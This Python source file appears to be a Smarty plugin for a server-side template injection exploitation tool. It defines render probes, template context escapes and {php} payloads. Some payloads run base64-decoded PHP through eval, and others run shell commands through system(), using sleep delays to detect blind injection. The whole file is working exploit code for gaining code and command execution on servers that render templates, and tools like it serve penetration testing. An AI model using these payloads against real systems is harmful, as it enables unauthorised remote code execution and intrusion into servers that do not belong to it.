from plugins.languages import php
from utils.loggers import log
from utils import rand
from utils.strings import quote
import base64
import re

class Smarty(php.Php):
    
    def init(self):

        self.update_actions({
            'render' : {
                'render': '%(code)s',
                'header': '{%(header)s}',
                'trailer': '{%(trailer)s}',
                'test_render': """{%(r1)s}{*%(comment)s*}{%(r2)s}""" % { 
                    'r1' : rand.randints[0],
                    'comment' : rand.randints[1],
                    'r2' : rand.randints[2]
                },
                'test_render_expected': '%(r1)s%(r2)s' % { 
                    'r1' : rand.randints[0],
                    'r2' : rand.randints[2]
                }
            },
            'evaluate' : {
                'call': 'render',
                'evaluate': """{php}%(code)s{/php}"""
            },
            'evaluate_blind' : {
                'call': 'inject',
                'evaluate_blind': """{php}$d="%(code_b64)s";eval("return (" . base64_decode(str_pad(strtr($d, '-_', '+/'), strlen($d)%%4,'=',STR_PAD_RIGHT)) . ") && sleep(%(delay)i);");{/php}"""
            },
            'execute_blind' : {
                'call': 'inject',
                'execute_blind': """{php}$d="%(code_b64)s";system(base64_decode(str_pad(strtr($d, '-_', '+/'), strlen($d)%%4,'=',STR_PAD_RIGHT)). " && sleep %(delay)i");{/php}"""
            },

        })

        self.set_contexts([

            # Text context, no closures
            { 'level': 0 },

            { 'level': 1, 'prefix': '%(closure)s}', 'suffix' : '{', 'closures' : php.ctx_closures },

            # {config_load file="missing_file"} raises an exception

            # Escape Ifs
            { 'level': 5, 'prefix': '%(closure)s}{/if}{if 1}', 'suffix' : '', 'closures' : php.ctx_closures },

            # Escape {assign var="%s" value="%s"}
            { 'level': 5, 'prefix': '%(closure)s var="" value=""}{assign var="" value=""}', 'suffix' : '', 'closures' : php.ctx_closures },

            # Comments
            { 'level': 5, 'prefix': '*}', 'suffix' : '{*' },
        
        ])